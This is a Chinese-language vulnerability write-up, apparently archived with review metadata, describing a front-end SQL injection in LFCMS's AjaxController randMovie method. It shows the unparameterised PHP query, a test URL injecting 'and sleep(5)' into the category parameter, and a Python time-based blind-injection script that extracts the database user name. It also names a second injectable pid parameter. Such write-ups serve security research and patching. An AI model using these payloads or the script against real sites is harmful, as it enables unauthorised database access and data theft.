---
source: "hatch 补库批 20260928"
product: "LFCMS / ThinkPHP3.2"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "LFCMS AjaxController.class.php 前台sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：Ajax.randMovie可达且movie有匹配数据；具体LFCMS版本缺"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-acb8caa9696b5a4ce0e6730b"
entity_id: "ve-acb8caa9696b5a4ce0e6730b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Ajax.randMovie可达且movie有匹配数据；具体LFCMS版本缺

- **结论使用边界（1）**：源码category/limit直接拼接明确；无单引号本身不是漏洞根因，应强调未参数化/类型验证。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：盲注脚本sleep5恰timeout5且捕获所有异常判真，易误报；循环缺终止长度。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **代码与转录边界（3）**：另Player.down pid仅提及未示证据应候选；与250同文，244有图和完整缩进。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# LFCMS AjaxController.class.php 前台sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

漏洞起始点位于`/Application/Home/Controller/AjaxController.class.php`文件中的`randMovie`方法，代码如下

![1.png](./.resource/LFCMSAjaxController.class.php前台sql注入漏洞/media/rId24.png)

第七行代码中调用了`Ajax`模型中的`randMovie`方法，同时`limit`和`category`是我们输入的可控的参数，跟进`randMovie`方法

    public function randMovie($limit=6,$category='') {
        if($category) {
            $type='and category='.$category;
        }
        $prefix=C('DB_PREFIX');
        $mlist=M()->query('SELECT * FROM `'.$prefix.'movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `'.$prefix.'movie`)-(SELECT MIN(id) FROM `'.$prefix.'movie`))+(SELECT MIN(id) FROM `'.$prefix.'movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx '.$type.' ORDER BY t1.id LIMIT '.$limit);
        foreach($mlist as $key=>$value) {
            $list[$key]=D('Tag')->movieChange($value,'movie');
        }
        return $list;
    }

在这里注意到`$type`与`$limit`在`sql`语句执行时均没有被单引号包裹，直接拼接到语句当中，这里就存在了sql注入的可能，首先我们在`movie`表里放一条数据，看一下正常执行时sql语句是如何执行的

![2.png](./.resource/LFCMSAjaxController.class.php前台sql注入漏洞/media/rId25.png)

查看数据库日志可以得到如下`sql`语句

    SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 ORDER BY t1.id LIMIT 1

接着来尝试下进行注入，测试链接如下

    http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&category=2 and sleep(5)

页面确实延迟了5秒，那么接着看一下后端数据库的语句

    SELECT * FROM `lf_movie` AS t1 JOIN (SELECT ROUND(RAND() * ((SELECT MAX(id) FROM `lf_movie`)-(SELECT MIN(id) FROM `lf_movie`))+(SELECT MIN(id) FROM `lf_movie`)) AS idx) AS t2 WHERE t1.id >= t2.idx and category=2 and sleep(5) ORDER BY t1.id LIMIT 1

基本可以判断该处存在着可用的注入点，接下来编写脚本跑一下数据库用户名试试

    import requests
    url = 'http://www.0-sec.org/index.php/Ajax/randMovie?limit=1&category=2 and '
    s = requests.session()
    result = ""
    for i in range(1,50):
        print('==========================')
        for j in range(32,127):
            payload = "if((ascii(substr((select user()),{},1))={}),sleep(5),0)".format(i,j)
            temp = url+payload
            try:
                s.get(temp,timeout=5)
            except:
                result+= chr(j)
                print(result)
                break

![3.png](./.resource/LFCMSAjaxController.class.php前台sql注入漏洞/media/rId26.png)

相同原理的利用点同样不止一个，如`/Application/Home/Controller/PlayerController.class.php`文件中的`down`方法调用了模型`movie`中的`getPlayerUrl`方法，该方法的`pid`参数同样可以注入

参考链接
--------

> https://xz.aliyun.com/t/7844
